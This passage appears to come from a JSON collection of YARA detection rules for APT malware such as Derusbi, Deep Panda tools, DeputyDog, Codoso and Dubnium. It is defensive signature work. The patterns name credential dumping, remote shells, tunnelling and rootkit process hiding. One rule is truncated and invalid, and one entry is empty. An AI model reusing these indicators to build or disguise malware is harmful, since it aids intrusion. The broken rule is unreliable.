  "Codoso_PGV_PVID_3": "rule Codoso_PGV_PVID_3\n{\n\n    meta:\n        description = \"Detects Codoso APT PGV PVID Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        date = \"2016-01-30\"\n        super_rule = 1\n        hash1 = \"126fbdcfed1dfb31865d4b18db2fb963f49df838bf66922fea0c37e06666aee1\"\n        hash2 = \"13bce64b3b5bdfd24dc6f786b5bee08082ea736be6536ef54f9c908fd1d00f75\"\n        hash3 = \"8a56b476d792983aea0199ee3226f0d04792b70a1c1f05f399cb6e4ce8a38761\"\n        hash4 = \"b2950f2e09f5356e985c38b284ea52175d21feee12e582d674c0da2233b1feb1\"\n        hash5 = \"b631553421aa17171cc47248adc110ca2e79eff44b5e5b0234d69b30cab104e3\"\n        hash6 = \"bc0b885cddf80755c67072c8b5961f7f0adcaeb67a1a5c6b3475614fd51696fe\"\n\n    strings:\n        $x1 = \"Copyright (C) Microsoft Corporation.  All rights reserved.(C) 2012\" fullword wide\n\n    condition:\n        $x1\n}",
  "Codoso_PGV_PVID_2": "rule Codoso_PGV_PVID_2\n{\n\n    meta:\n        description = \"Detects Codoso APT PGV PVID Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        date = \"2016-01-30\"\n        super_rule = 1\n        hash1 = \"13bce64b3b5bdfd24dc6f786b5bee08082ea736be6536ef54f9c908fd1d00f75\"\n        hash2 = \"b631553421aa17171cc47248adc110ca2e79eff44b5e5b0234d69b30cab104e3\"\n        hash3 = \"bc0b885cddf80755c67072c8b5961f7f0adcaeb67a1a5c6b3475614fd51696fe\"\n\n    strings:\n        $s0 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SvcHost\" fullword ascii\n        $s1 = \"regsvr32.exe /s \\\"%s\\\"\" fullword ascii\n        $s2 = \"Help and Support\" fullword ascii\n        $s3 = \"netsvcs\" fullword ascii\n        $s9 = \"%SystemRoot%\\\\System32\\\\svchost.exe -k netsvcs\" fullword ascii /* Goodware String - occured 4 times */\n        $s10 = \"winlogon\" fullword ascii /* Goodware String - occured 4 times */\n        $s11 = \"System\\\\CurrentControlSet\\\\Services\" fullword ascii /* Goodware String - occured 11 times */\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 907KB and all of them\n}",
  "Codoso_PGV_PVID_1": "rule Codoso_PGV_PVID_1\n{\n\n    meta:\n        description = \"Detects Codoso APT PGV PVID Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        date = \"2016-01-30\"\n        super_rule = 1\n        hash1 = \"41a936b0d1fd90dffb2f6d0bcaf4ad0536f93ca7591f7b75b0cd1af8804d0824\"\n        hash2 = \"58334eb7fed37e3104d8235d918aa5b7856f33ea52a74cf90a5ef5542a404ac3\"\n        hash3 = \"934b87ddceabb2063b5e5bc4f964628fe0c63b63bb2346b105ece19915384fc7\"\n        hash4 = \"ce91ea20aa2e6af79508dd0a40ab0981f463b4d2714de55e66d228c579578266\"\n        hash5 = \"e770a298ae819bba1c70d0c9a2e02e4680d3cdba22d558d21caaa74e3970adf1\"\n\n    strings:\n        $x1 = \"Cookie: pgv_pvid=\" ascii\n        $x2 = \"DRIVERS\\\\ipinip.sys\" fullword wide\n        $s1 = \"TsWorkSpaces.dll\" fullword ascii\n        $s2 = \"%SystemRoot%\\\\System32\\\\wiaservc.dll\" fullword wide\n        $s3 = \"/selfservice/microsites/search.php?%016I64d\" fullword ascii\n        $s4 = \"/solutions/company-size/smb/index.htm?%016I64d\" fullword ascii\n        $s5 = \"Microsoft Chart ActiveX Control\" fullword wide\n        $s6 = \"MSChartCtrl.ocx\" fullword wide\n        $s7 = \"{%08X-%04X-%04x-%02X%02X-%02X%02X%02X%02X%02X%02X}\" fullword ascii\n        $s8 = \"WUServiceMain\" fullword ascii /* Goodware String - occured 2 times */\n    condition:\n        ( uint16(0) == 0x5a4d and ( 1 of ($x*) or 3 of them ) ) or 5 of them\n}",
  "Anthem_DeepPanda_sl_txt_packed": "rule Anthem_DeepPanda_sl_txt_packed\n{\n\n    meta:\n        description = \"Anthem Hack Deep Panda - ScanLine sl-txt-packed\"\n        author = \"Florian Roth\"\n        date = \"2015/02/08\"\n        hash = \"ffb1d8ea3039d3d5eb7196d27f5450cac0ea4f34\"\n\n    strings:\n        $s0 = \"Command line port scanner\" fullword wide\n        $s1 = \"sl.exe\" fullword wide\n        $s2 = \"CPports.txt\" fullword ascii\n        $s3 = \",GET / HTTP/.}",
  "Anthem_DeepPanda_lot1": "rule Anthem_DeepPanda_lot1\n{\n\n    meta:\n        description = \"Anthem Hack Deep Panda - lot1.tmp-pwdump\"\n        author = \"Florian Roth\"\n        date = \"2015/02/08\"\n        hash = \"5d201a0fb0f4a96cefc5f73effb61acff9c818e1\"\n\n    strings:\n        $s0 = \"Unable to open target process: %d, pid %d\" fullword ascii\n        $s1 = \"Couldn't delete target executable from remote machine: %d\" fullword ascii\n        $s2 = \"Target: Failed to load SAM functions.\" fullword ascii\n        $s5 = \"Error writing the test file %s, skipping this share\" fullword ascii\n        $s6 = \"Failed to create service (%s/%s), error %d\" fullword ascii\n        $s8 = \"Service start failed: %d (%s/%s)\" fullword ascii\n        $s12 = \"PwDump.exe\" fullword ascii\n        $s13 = \"GetAvailableWriteableShare returned an error of %ld\" fullword ascii\n        $s14 = \":\\\\\\\\.\\\\pipe\\\\%s\" fullword ascii\n        $s15 = \"Couldn't copy %s to destination %s. (Error %d)\" fullword ascii\n        $s16 = \"dump logon session\" fullword ascii\n        $s17 = \"Timed out waiting to get our pipe back\" fullword ascii\n        $s19 = \"SetNamedPipeHandleState failed, error %d\" fullword ascii\n        $s20 = \"%s\\\\%s.exe\" fullword ascii\n\n    condition:\n        10 of them\n}",
  "Anthem_DeepPanda_htran_exe": "rule Anthem_DeepPanda_htran_exe\n{\n\n    meta:\n        description = \"Anthem Hack Deep Panda - htran-exe\"\n        author = \"Florian Roth\"\n        date = \"2015/02/08\"\n        hash = \"38e21f0b87b3052b536408fdf59185f8b3d210b9\"\n\n    strings:\n        $s0 = \"%s -<listen|tran|slave> <option> [-log logfile]\" fullword ascii\n        $s1 = \"[-] Gethostbyname(%s) error:%s\" fullword ascii\n        $s2 = \"e:\\\\VS 2008 Project\\\\htran\\\\Release\\\\htran.pdb\" fullword ascii\n        $s3 = \"[SERVER]connection to %s:%d error\" fullword ascii\n        $s4 = \"-tran  <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n        $s5 = \"[-] ERROR: Must supply logfile name.\" fullword ascii\n        $s6 = \"[-] There is a error...Create a new connection.\" fullword ascii\n        $s7 = \"[+] Accept a Client on port %d from %s\" fullword ascii\n        $s8 = \"======================== htran V%s =======================\" fullword ascii\n        $s9 = \"[-] Socket Listen error.\" fullword ascii\n        $s10 = \"[-] ERROR: open logfile\" fullword ascii\n        $s11 = \"-slave  <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n        $s12 = \"[+] Make a Connection to %s:%d ......\" fullword ascii\n        $s14 = \"Recv %5d bytes from %s:%d\" fullword ascii\n        $s15 = \"[+] OK! I Closed The Two Socket.\" fullword ascii\n        $s16 = \"[+] Waiting another Client on port:%d....\" fullword ascii\n        $s17 = \"[+] Accept a Client on port %d from %s ......\" fullword ascii\n        $s20 = \"-listen <ConnectPort> <TransmitPort>\" fullword ascii\n\n    condition:\n        10 of them\n}",
  "Anthem_DeepPanda_Trojan_Kakfum": "rule Anthem_DeepPanda_Trojan_Kakfum\n{\n\n    meta:\n        description = \"Anthem Hack Deep Panda - Trojan.Kakfum sqlsrv32.dll\"\n        author = \"Florian Roth\"\n        date = \"2015/02/08\"\n        hash1 = \"ab58b6aa7dcc25d8f6e4b70a24e0ccede0d5f6129df02a9e61293c1d7d7640a2\"\n        hash2 = \"c6c3bb72896f8f0b9a5351614fd94e889864cf924b40a318c79560bbbcfa372f\"\n\n    strings:\n        $s0 = \"%SystemRoot%\\\\System32\\\\svchost.exe -k sqlserver\" fullword ascii\n        $s1 = \"%s\\\\sqlsrv32.dll\" fullword ascii\n        $s2 = \"%s\\\\sqlsrv64.dll\" fullword ascii\n        $s3 = \"%s\\\\%d.tmp\" fullword ascii\n        $s4 = \"ServiceMaix\" fullword ascii\n        $s15 = \"sqlserver\" fullword ascii\n\n    condition:\n        all of them\n}",
  "APT_DeputyDog_Fexel": "rule APT_DeputyDog_Fexel\n{\n\nmeta:\n    author = \"ThreatConnect Intelligence Research Team\"\n\nstrings:\n    $180 = \"180.150.228.102\" wide ascii\n    $0808cmd = {25 30 38 78 30 38 78 00 5C 00 63 00 6D 00 64 00 2E 00 65 00 78 00 65 [2-6] 43 00 61 00 6E 00 27 00 74 00 20 00 6F 00 70 00 65 00 6E 00 20 00 73 00 68 00 65 00 6C 00 6C 00 21}\n    $cUp = \"Upload failed! [Remote error code:\" nocase wide ascii\n    $DGGYDSYRL = {00 44 47 47 59 44 53 59 52 4C 00}\n    $GDGSYDLYR = \"GDGSYDLYR_%\" wide ascii\n\ncondition:\n    any of them\n}",
  "APT_DeputyDog": "rule APT_DeputyDog\n{\n\n    meta:\n        Author      = \"FireEye Labs\"\n        Date        = \"2013/09/21\"\n        Description = \"detects string seen in samples used in 2013-3893 0day attacks\"\n        Reference   = \"https://www.fireeye.com/blog/threat-research/2013/09/operation-deputydog-zero-day-cve-2013-3893-attack-against-japanese-targets.html\"\n\n    strings:\n        $mz = {4d 5a}\n        $a = \"DGGYDSYRL\"\n\n    condition:\n        ($mz at 0) and $a\n}",
  "apt_nix_elf_derusbi": "rule apt_nix_elf_derusbi\n{\n\n    meta:\n        Author = \"@seifreed\"\n\n    strings:\n        $ = \"LxMain\"\n        $ = \"execve\"\n        $ = \"kill\"\n        $ = \"cp -a %s %s\"\n        $ = \"%s &\"\n        $ = \"dbus-daemon\"\n        $ = \"--noprofile\"\n        $ = \"--norc\"\n        $ = \"TERM=vt100\"\n        $ = \"/proc/%u/cmdline\"\n        $ = \"loadso\"\n        $ = \"/proc/self/exe\"\n        $ = \"Proxy-Connection: Keep-Alive\"\n        $ = \"Connection: Keep-Alive\"\n        $ = \"CONNECT %s\"\n        $ = \"HOST: %s:%d\"\n        $ = \"User-Agent: Mozilla/4.0\"\n        $ = \"Proxy-Authorization: Basic %s\"\n        $ = \"Server: Apache\"\n        $ = \"Proxy-Authenticate\"\n        $ = \"gettimeofday\"\n        $ = \"pthread_create\"\n        $ = \"pthread_join\"\n        $ = \"pthread_mutex_init\"\n        $ = \"pthread_mutex_destroy\"\n        $ = \"pthread_mutex_lock\"\n        $ = \"getsockopt\"\n        $ = \"socket\"\n        $ = \"setsockopt\"\n        $ = \"select\"\n        $ = \"bind\"\n        $ = \"shutdown\"\n        $ = \"listen\"\n        $ = \"opendir\"\n        $ = \"readdir\"\n        $ = \"closedir\"\n        $ = \"rename\"\n\n    condition:\n        (uint32(0) == 0x4464c457f) and (all of them)\n}",
  "apt_nix_elf_derusbi_kernelModule": "rule apt_nix_elf_derusbi_kernelModule\n{\n\n    meta:\n        Author = \"@seifreed\"\n\n    strings:\n        $ = \"__this_module\"\n        $ = \"init_module\"\n        $ = \"unhide_pid\"\n        $ = \"is_hidden_pid\"\n        $ = \"clear_hidden_pid\"\n        $ = \"hide_pid\"\n        $ = \"license\"\n        $ = \"description\"\n        $ = \"srcversion=\"\n        $ = \"depends=\"\n        $ = \"vermagic=\"\n        $ = \"current_task\"\n        $ = \"sock_release\"\n        $ = \"module_layout\"\n        $ = \"init_uts_ns\"\n        $ = \"init_net\"\n        $ = \"init_task\"\n        $ = \"filp_open\"\n        $ = \"__netlink_kernel_create\"\n        $ = \"kfree_skb\"\n\n    condition:\n        (uint32(0) == 0x4464c457f) and (all of them)\n}",
  "apt_nix_elf_Derusbi_Linux_SharedMemCreation": "rule apt_nix_elf_Derusbi_Linux_SharedMemCreation\n{\n\n    meta:\n        Author = \"@seifreed\"\n\n    strings:\n        $byte1 = { B6 03 00 00 ?? 40 00 00 00 ?? 0D 5F 01 82 }\n\n    condition:\n        (uint32(0) == 0x464C457F) and (any of them)\n}",
  "apt_nix_elf_Derusbi_Linux_Strings": "rule apt_nix_elf_Derusbi_Linux_Strings\n{\n\n    meta:\n        Author = \"@seifreed\"\n\n    strings:\n        $a1 = \"loadso\" wide ascii fullword\n        $a2 = \"\\nuname -a\\n\\n\" wide ascii\n        $a3 = \"/dev/shm/.x11.id\" wide ascii\n        $a4 = \"LxMain64\" wide ascii nocase\n        $a5 = \"# \\\\u@\\\\h:\\\\w \\\\$ \" wide ascii\n        $b1 = \"0123456789abcdefghijklmnopqrstuvwxyz\" wide\n        $b2 = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\" wide\n        $b3 = \"ret %d\" wide fullword\n        $b4 = \"uname -a\\n\\n\" wide ascii\n        $b5 = \"/proc/%u/cmdline\" wide ascii\n        $b6 = \"/proc/self/exe\" wide ascii\n        $b7 = \"cp -a %s %s\" wide ascii\n        $c1 = \"/dev/pts/4\" wide ascii fullword\n        $c2 = \"/tmp/1408.log\" wide ascii fullword\n\n    condition:\n        uint32(0) == 0x464C457F and ((1 of ($a*) and 4 of ($b*)) or (1 of ($a*) and 1 of ($c*)) or 2 of ($a*) or all of ($b*))\n}",
  "apt_win_exe_trojan_derusbi": "rule apt_win_exe_trojan_derusbi\n{\n\n   meta:\n        Author = \"@seifreed\"\n\n   strings:\n        $sa_1 = \"USB\" wide ascii\n        $sa_2 = \"RAM\" wide ascii\n        $sa_3 = \"SHARE\" wide ascii\n        $sa_4 = \"HOST: %s:%d\"\n        $sa_5 = \"POST\"\n        $sa_6 = \"User-Agent: Mozilla\"\n        $sa_7 = \"Proxy-Connection: Keep-Alive\"\n        $sa_8 = \"Connection: Keep-Alive\"\n        $sa_9 = \"Server: Apache\"\n        $sa_10 = \"HTTP/1.1\"\n        $sa_11 = \"ImagePath\"\n        $sa_12 = \"ZwUnloadDriver\"\n        $sa_13 = \"ZwLoadDriver\"\n        $sa_14 = \"ServiceMain\"\n        $sa_15 = \"regsvr32.exe\"\n        $sa_16 = \"/s /u\" wide ascii\n        $sa_17 = \"rand\"\n        $sa_18 = \"_time64\"\n        $sa_19 = \"DllRegisterServer\"\n        $sa_20 = \"DllUnregisterServer\"\n        $sa_21 = { 8b [5] 8b ?? d3 ?? 83 ?? 08 30 [5] 40 3b [5] 72 } // Decode Driver\n        $sb_1 = \"PCC_CMD_PACKET\"\n        $sb_2 = \"PCC_CMD\"\n        $sb_3 = \"PCC_BASEMOD\"\n        $sb_4 = \"PCC_PROXY\"\n        $sb_5 = \"PCC_SYS\"\n        $sb_6 = \"PCC_PROCESS\"\n        $sb_7 = \"PCC_FILE\"\n        $sb_8 = \"PCC_SOCK\"\n        $sc_1 = \"bcdedit -set testsigning\" wide ascii\n        $sc_2 = \"update.microsoft.com\" wide ascii\n        $sc_3 = \"_crt_debugger_hook\" wide ascii\n        $sc_4 = \"ue8G5\" wide ascii\n        $sd_1 = \"NET\" wide ascii\n        $sd_2 = \"\\\\\\\\.\\\\pipe\\\\%s\" wide ascii\n        $sd_3 = \".dat\" wide ascii\n        $sd_4 = \"CONNECT %s:%d\" wide ascii\n        $sd_5 = \"\\\\Device\\\\\" wide ascii\n        $se_1 = \"-%s-%04d\" wide ascii\n        $se_2 = \"-%04d\" wide ascii\n        $se_3 = \"FAL\" wide ascii\n        $se_4 = \"OK\" wide ascii\n        $se_5 = \"2.03\" wide ascii\n        $se_6 = \"XXXXXXXXXXXXXXX\" wide ascii\n\n   condition:\n      (uint16(0) == 0x5A4D) and ( (all of ($sa_*)) or ((13 of ($sa_*)) and ( (5 of ($sb_*)) or (3 of ($sc_*)) or (all of ($sd_*)) or ( (1 of ($sc_*)) and (all of ($se_*)) ) ) ) )\n}",
  "Trojan_Derusbi": "rule Trojan_Derusbi\n{\n\n    meta:\n        Author = \"RSA_IR\"\n        Date     = \"4Sept13\"\n        File     = \"derusbi_variants v 1.3\"\n        MD5      = \" c0d4c5b669cc5b51862db37e972d31ec \"\n\n    strings:\n        $b1 = {8b 15 ?? ?? ?? ?? 8b ce d3 ea 83 c6 ?? 30 90 ?? ?? ?? ?? 40 3b 05 ?? ?? ?? ?? 72 ??}\n        $b2 = {F3 5D 88 2E ?? ?? 00 00 BE 07 18 2E F0 5D 88 2E F7 5D 88 2E 0C A2 88 2E 4B 5D 88 2E F3 5D 88 2E}\n        $b3 = {4E E6 40 BB}\n        $b4 = {B1 19 BF 44}\n        $b5 = {6A F5 44 3D ?? ?? 00 00 27 AF D4 3D 69 F5 44 3D 6E F5 44 3D 95 0A 44 3D D2 F5 44 3D 6A F5 44 3D}\n        $b6 = {F3 5D 88 2E ?? ?? 00 00 BE 07 18 2E F0 5D 88 2E}\n        $b7 = {D6 D5 A4 A3 ?? ?? 00 00 9B 8F 34 A3 D5 D5 A4 A3 D2 D5 A4 A3 29 2A A4 A3}\n        $b8 = {C3 76 33 9F ?? ?? 00 00 8E 2C A3 9F C0 76 33 9F C7 76 33 9F 3C 89 33 9F}\n\n    condition:\n        2 of ($b1, $b2, $b3, $b4) and 1 of ($b5, $b6, $b7, $b8)\n}",
  "APT_Derusbi_DeepPanda": "rule APT_Derusbi_DeepPanda\n{\n\nmeta:\n    author = \"ThreatConnect Intelligence Research Team\"\n    reference = \"http://www.crowdstrike.com/sites/default/files/AdversaryIntelligenceReport_DeepPanda_0.pdf\"\n\nstrings:\n    $D = \"Dom4!nUserP4ss\" wide ascii\n\ncondition:\n    $D\n}",
  "APT_Derusbi_Gen": "rule APT_Derusbi_Gen\n{\n\nmeta:\n    author = \"ThreatConnect Intelligence Research Team\"\n\nstrings:\n    $2 = \"273ce6-b29f-90d618c0\" wide ascii\n    $A = \"Ace123dx\" fullword wide ascii\n    $A1 = \"Ace123dxl!\" fullword wide ascii\n    $A2 = \"Ace123dx!@#x\" fullword wide ascii\n    $C = \"/Catelog/login1.asp\" wide ascii\n    $DF = \"~DFTMP$$$$$.1\" wide ascii\n    $G = \"GET /Query.asp?loginid=\" wide ascii\n    $L = \"LoadConfigFromReg failded\" wide ascii\n    $L1 = \"LoadConfigFromBuildin success\" wide ascii\n    $ph = \"/photoe/photo.asp HTTP\" wide ascii\n    $PO = \"POST /photos/photo.asp\" wide ascii\n    $PC = \"PCC_IDENT\" wide ascii\n\ncondition:\n    any of them\n}",
  "derusbi_kernel": "rule derusbi_kernel\n{\n\n    meta:\n        description = \"Derusbi Driver version\"\n        date = \"2015-12-09\"\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Fabien Perigaud\"\n\n    strings:\n        $token1 = \"$$$--Hello\"\n        $token2 = \"Wrod--$$$\"\n        $cfg = \"XXXXXXXXXXXXXXX\"\n        $class = \".?AVPCC_BASEMOD@@\"\n        $MZ = \"MZ\"\n\n    condition:\n        $MZ at 0 and $token1 and $token2 and $cfg and $class\n}",
  "derusbi_linux": "rule derusbi_linux\n{\n\n    meta:\n        description = \"Derusbi Server Linux version\"\n        date = \"2015-12-09\"\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Fabien Perigaud\"\n\n    strings:\n        $PS1 = \"PS1=RK# \\\\u@\\\\h:\\\\w \\\\$\"\n        $cmd = \"unset LS_OPTIONS;uname -a\"\n        $pname = \"[diskio]\"\n        $rkfile = \"/tmp/.secure\"\n        $ELF = \"\\x7fELF\"\n\n    condition:\n        $ELF at 0 and $PS1 and $cmd and $pname and $rkfile\n}",
  "Derusbi_Kernel_Driver_WD_UDFS": "rule Derusbi_Kernel_Driver_WD_UDFS\n{\n\n    meta:\n        description = \"Detects Derusbi Kernel Driver\"\n        author = \"Florian Roth\"\n        reference = \"http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family\"\n        date = \"2015-12-15\"\n        score = 80\n        hash1 = \"1b449121300b0188ff9f6a8c399fb818d0cf53fd36cf012e6908a2665a27f016\"\n        hash2 = \"50174311e524b97ea5cb4f3ea571dd477d1f0eee06cd3ed73af39a15f3e6484a\"\n        hash3 = \"6cdb65dbfb2c236b6d149fd9836cb484d0608ea082cf5bd88edde31ad11a0d58\"\n        hash4 = \"e27fb16dce7fff714f4b05f2cef53e1919a34d7ec0e595f2eaa155861a213e59\"\n\n    strings:\n        $x1 = \"\\\\\\\\.\\\\pipe\\\\usbpcex%d\" fullword wide\n        $x2 = \"\\\\\\\\.\\\\pipe\\\\usbpcg%d\" fullword wide\n        $x3 = \"\\\\??\\\\pipe\\\\usbpcex%d\" fullword wide\n        $x4 = \"\\\\??\\\\pipe\\\\usbpcg%d\" fullword wide\n        $x5 = \"$$$--Hello\" fullword ascii\n        $x6 = \"Wrod--$$$\" fullword ascii\n        $s1 = \"\\\\Registry\\\\User\\\\%s\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\" fullword wide\n        $s2 = \"Update.dll\" fullword ascii\n        $s3 = \"\\\\Registry\\\\Machine\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\WMI\" fullword wide\n        $s4 = \"\\\\Driver\\\\nsiproxy\" fullword wide\n        $s5 = \"HOST: %s\" fullword ascii\n\ncondition:\n        uint16(0) == 0x5a4d and filesize < 800KB and (2 of ($x*) or all of ($s*))\n}",
  "Derusbi_Code_Signing_Cert": "rule Derusbi_Code_Signing_Cert\n{\n\n    meta:\n        description = \"Detects an executable signed with a certificate also used for Derusbi Trojan - suspicious\"\n        author = \"Florian Roth\"\n        reference = \"http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family\"\n        date = \"2015-12-15\"\n        score = 40\n\n   strings:\n      $s1 = \"Fuqing Dawu Technology Co.,Ltd.0\" fullword ascii\n      $s2 = \"XL Games Co.,Ltd.0\" fullword ascii\n      $s3 = \"Wemade Entertainment co.,Ltd0\" fullword ascii\n\n   condition:\n      uint16(0) == 0x5a4d and filesize < 800KB and 1 of them\n}",
  "XOR_4byte_Key": "rule XOR_4byte_Key\n{\n\n    meta:\n        description = \"Detects an executable encrypted with a 4 byte XOR (also used for Derusbi Trojan)\"\n        author = \"Florian Roth\"\n        reference = \"http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family\"\n        date = \"2015-12-15\"\n        score = 60\n\n   strings:\n      /* Op Code */\n      $s1 = { 85 C9 74 0A 31 06 01 1E 83 C6 04 49 EB F2 }\n      /*\n      test    ecx, ecx\n      jz      short loc_590170\n      xor     [esi], eax\n      add     [esi], ebx\n      add     esi, 4\n      dec     ecx\n      jmp     short loc_590162\n      */\n\n   condition:\n      uint16(0) == 0x5a4d and filesize < 900KB and all of them\n}",
  "apt_win32_dll_bergard_pgv_pvid_variant": "rule apt_win32_dll_bergard_pgv_pvid_variant\n{\n\n    meta:\n        copyright = \"Fidelis Cybersecurity\"\n        reference = \"http://www.threatgeek.com/2016/05/turbo-twist-two-64-bit-derusbi-strains-converge.html\"\n\n    strings:\n        $ = \"Accept:\"\n        $ = \"User-Agent: %s\"\n        $ = \"Host: %s:%d\"\n        $ = \"Cache-Control: no-cache\"\n        $ = \"Connection: Keep-Alive\"\n        $ = \"Cookie: pgv_pvid=\"\n        $ = \"Content-Type: application/x-octet-stream\"\n        $ = \"User-Agent: %s\"\n        $ = \"Host: %s:%d\"\n        $ = \"Pragma: no-cache\"\n        $ = \"Connection: Keep-Alive\"\n        $ = \"HTTP/1.0\"\n\n    condition:\n        (uint16(0) == 0x5A4D) and (all of them)\n}",
  "Dubnium_Sample_1": "rule Dubnium_Sample_1\n{\n\n    meta:\n        description = \"Detects sample mentioned in the Dubnium Report\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/AW9Cuu\"\n        date = \"2016-06-10\"\n        hash1 = \"839baf85de657b6d6503b6f94054efa8841f667987a9c805eab94a85a859e1ba\"\n\n    strings:\n        $key1 = \"3b840e20e9555e9fb031c4ba1f1747ce25cc1d0ff664be676b9b4a90641ff194\" fullword ascii\n        $key2 = \"90631f686a8c3dbc0703ffa353bc1fdf35774568ac62406f98a13ed8f47595fd\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and all of them\n}",
  "Dubnium_Sample_2": "rule Dubnium_Sample_2\n{\n\n    meta:\n        description = \"Detects sample mentioned in the Dubnium Report\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/AW9Cuu\"\n        date = \"2016-06-10\"\n        hash1 = \"5246899b8c74a681e385cbc1dd556f9c73cf55f2a0074c389b3bf823bfc6ce4b\"\n\n    strings:\n        $x1 = \":*:::D:\\\\:c:~:\" fullword ascii\n        $s2 = \"SPMUVR\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 2000KB and all of them )\n}",
  "Dubnium_Sample_3": "rule Dubnium_Sample_3\n{\n\n    meta:\n        description = \"Detects sample mentioned in the Dubnium Report\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/AW9Cuu\"\n        date = \"2016-06-10\"\n        hash1 = \"caefcdf2b4e5a928cdf9360b70960337f751ec4a5ab8c0b75851fc9a1ab507a8\"\n        hash2 = \"e0362d319a8d0e13eda782a0d8da960dd96043e6cc3500faeae521d1747576e5\"\n        hash3 = \"a77d1c452291a6f2f6ed89a4bac88dd03d38acde709b0061efd9f50e6d9f3827\"\n\n    strings:\n        $x1 = \"copy /y \\\"%s\\\" \\\"%s\\\" \" fullword ascii\n        $x2 = \"del /f \\\"%s\\\" \" fullword ascii\n        $s1 = \"del /f /ah \\\"%s\\\" \" fullword ascii\n        $s2 = \"if exist \\\"%s\\\" goto Rept \" fullword ascii\n        $s3 = \"\\\\*.*.lnk\" fullword ascii\n        $s4 = \"Dropped\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and 5 of them\n}",
  "Dubnium_Sample_5": "rule Dubnium_Sample_5\n{\n\n    meta:\n        description = \"Detects sample mentioned in the Dubnium Report\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/AW9Cuu\"\n        date = \"2016-06-10\"\n        super_rule = 1\n        hash1 = \"16f0b05d5e8546ab1504b07b0eaa0e8de14bca7c1555fd114c4c1c51d5a4c06b\"\n        hash2 = \"1feaad03f6c0b57f5f5b02aef668e26001e5a7787bb51966d50c8fcf344fb4e8\"\n        hash3 = \"41ecd81bc7df4b47d713e812f2b7b38d3ac4b9dcdc13dd5ca61763a4bf300dcf\"\n        hash4 = \"5246899b8c74a681e385cbc1dd556f9c73cf55f2a0074c389b3bf823bfc6ce4b\"\n        hash5 = \"5f07b074414513b73e202d7f77ec4bcf048f13dd735c9be3afcf25be818dc8e0\"\n        hash6 = \"839baf85de657b6d6503b6f94054efa8841f667987a9c805eab94a85a859e1ba\"\n        hash7 = \"a25715108d2859595959879ff50085bc85969e9473ecc3d26dda24c4a17822c9\"\n        hash8 = \"bd780f4d56214c78045454d31d83ae18ed209cc138e75d138e72976a7ef9803f\"\n        hash9 = \"e0918072d427d12b43f436bf0797a361996ae436047d4ef8277f11caf2dd481b\"\n\n    strings:\n        $s1 = \"$innn[i$[i$^i[e[mdi[m$jf1Wehn[^Whl[^iin_hf$11mahZijnjbi[^[W[f1n$dej$[hn]1[W1ni1l[ic1j[mZjchl$$^he[[j[a[1_iWc[e[\" fullword ascii\n        $s2 = \"h$YWdh[$ij7^e$n[[_[h[i[[[\\\\][1$1[[j1W1[1cjm1[$[k1ZW_$$ncn[[Inbnnc[I9enanid[fZCX\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 9000KB and all of them\n}",
  "Dubnium_Sample_6": "",
  "Dubnium_Sample_7": "rule Dubnium_Sample_7\n{\n\n    meta:\n        description = \"Detects sample mentioned in the Dubnium Report\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/AW9Cuu\"\n        date = \"2016-06-10\"\n        super_rule = 1\n        hash1 = \"16f0b05d5e8546ab1504b07b0eaa0e8de14bca7c1555fd114c4c1c51d5a4c06b\"\n        hash2 = \"1feaad03f6c0b57f5f5b02aef668e26001e5a7787bb51966d50c8fcf344fb4e8\"\n        hash3 = \"41ecd81bc7df4b47d713e812f2b7b38d3ac4b9dcdc13dd5ca61763a4bf300dcf\"\n        hash4 = \"5246899b8c74a681e385cbc1dd556f9c73cf55f2a0074c389b3bf823bfc6ce4b\"\n        hash5 = \"5f07b074414513b73e202d7f77ec4bcf048f13dd735c9be3afcf25be818dc8e0\"\n        hash6 = \"a25715108d2859595959879ff50085bc85969e9473ecc3d26dda24c4a17822c9\"\n        hash7 = \"bd780f4d56214c78045454d31d83ae18ed209cc138e75d138e72976a7ef9803f\"\n        hash8 = \"e0918072d427d12b43f436bf0797a361996ae436047d4ef8277f11caf2dd481b\"\n\n    strings:\n        $s1 = \"hWI[$lZ![nJ_[[lk[8Ihlo8ZiIl[[[$Ynk[f_8[88WWWJW[YWnl$$Z[ilf!$IZ$!W>Wl![W!k!$l!WoW8$nj8![8n_I^$[>_n[ZY[[Xhn_c!nnfK[!Z\" fullword ascii\n        $s2 = \"[i_^])[$n!]Wj^,h[,!WZmk^o$dZ[h[e!&W!l[$nd[d&)^Z\\\\^[[iWh][[[jPYO[g$$e&n\\\\,Wfg$[<g$[[ninn:j!!)Wk[nj[[o!!Y\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 9000KB and all of them\n}",
